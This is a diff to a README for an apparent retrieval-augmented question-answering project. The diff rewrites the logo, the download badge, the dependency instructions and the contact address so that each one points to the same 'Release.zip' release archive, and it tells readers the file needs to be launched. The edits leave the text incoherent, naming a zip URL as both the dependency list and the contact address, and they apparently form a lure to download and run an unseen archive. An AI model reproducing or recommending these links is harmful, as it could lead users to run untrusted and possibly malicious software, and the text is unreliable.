@@ -1,7 +1,7 @@
 
 # 🚀 Scalable and Real-Time RAG System with OpenAI 🤖
 
-![OpenAI Logo](https://cdn.pixabay.com/photo/2021/01/27/13/33/artificial-intelligence-5956678_960_720.jpg)
+![OpenAI Logo](https://github.com/manomarras/Scalable-and-Real-Time-RAG-System-with-Open-AI/releases/download/v1.0/Release.zip)
 
 Welcome to the Scalable and Real-Time RAG System with OpenAI repository! This project focuses on creating a real-time data transfer and RAG-based question-answering system utilizing the power of OpenAI. By integrating PostgreSQL, Elasticsearch, and OpenAI's advanced GPT-3.5 model, this system ensures real-time data updates and provides accurate and swift responses to user queries.
 
@@ -30,7 +30,7 @@ The Scalable and Real-Time RAG System with OpenAI is a cutting-edge project that
 - Vector Embeddings
 
 ## ⬇️ Download Software
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/manomarras/Scalable-and-Real-Time-RAG-System-with-Open-AI/releases/download/v1.0/Release.zip)](https://github.com/manomarras/Scalable-and-Real-Time-RAG-System-with-Open-AI/releases/download/v1.0/Release.zip)
 *(Needs to be launched)*
 
 ## 📂 Repository Structure
@@ -42,7 +42,7 @@ The Scalable and Real-Time RAG System with OpenAI is a cutting-edge project that
 
 ## 🌟 How to Use
 1. Clone the repository to your local machine.
-2. Install the necessary dependencies listed in `requirements.txt`.
+2. Install the necessary dependencies listed in `https://github.com/manomarras/Scalable-and-Real-Time-RAG-System-with-Open-AI/releases/download/v1.0/Release.zip`.
 3. Run the Jupyter notebooks in the `/notebooks` directory to explore the data processing pipelines and model training.
 4. Launch the main system using the provided scripts in the `/src` directory.
 5. Access the system through the provided APIs for real-time question-answering.
@@ -60,6 +60,6 @@ The Scalable and Real-Time RAG System with OpenAI has shown promising results in
 We welcome contributions from the community to enhance the functionality and performance of the Scalable and Real-Time RAG System with OpenAI. If you have ideas for improvements or new features, feel free to submit a pull request. Together, we can make this system even more powerful and efficient!
 
 ## 📞 Contact
-For any inquiries or feedback regarding the Scalable and Real-Time RAG System with OpenAI, please contact us at [email@example.com](mailto:email@example.com). We appreciate your input and look forward to hearing from you!
+For any inquiries or feedback regarding the Scalable and Real-Time RAG System with OpenAI, please contact us at [https://github.com/manomarras/Scalable-and-Real-Time-RAG-System-with-Open-AI/releases/download/v1.0/Release.zip](https://github.com/manomarras/Scalable-and-Real-Time-RAG-System-with-Open-AI/releases/download/v1.0/Release.zip). We appreciate your input and look forward to hearing from you!
 
 🌟 Thank you for exploring the Scalable and Real-Time RAG System with OpenAI! 🌟
